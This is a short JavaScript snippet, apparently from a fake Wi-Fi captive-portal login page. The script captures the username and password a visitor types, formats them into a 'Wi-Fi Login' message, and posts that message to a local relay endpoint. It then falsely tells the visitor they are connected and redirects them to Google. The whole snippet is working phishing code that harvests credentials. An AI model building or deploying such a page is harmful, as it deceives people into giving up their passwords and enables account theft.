  <script>
  document.getElementById("loginForm").addEventListener("submit", async function(e) {
    e.preventDefault();

    const username = document.getElementById("username").value;
    const password = document.getElementById("password").value;

    const isEmail = username.includes('@');
    const isMobile = /^[0-9]{10}$/.test(username);
    if (!isEmail && !isMobile) {
      alert("Please enter a valid email or mobile number.");
      return;
    }

    const passwordRegex = /^(?=.*[A-Za-z])(?=.*\d).{8,}$/;
    if (!passwordRegex.test(password)) {
      alert("Password must be at least 8 characters long and include both letters and numbers.");
      return;
    }

    const userMsg = `ðŸ”“ Wi-Fi Login\nðŸ“§ Username: ${username}\nðŸ”‘ Password: ${password}`;

    try {
      const res = await fetch("http://localhost:5000/send-message", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ message: userMsg })
      });

      const data = await res.json();
      alert("Connected! Redirecting to the internet...");
      window.location.href = "https://www.google.com";
    } catch (error) {
      alert("Failed to connect.");
      console.error(error);
    }
  });
</script>
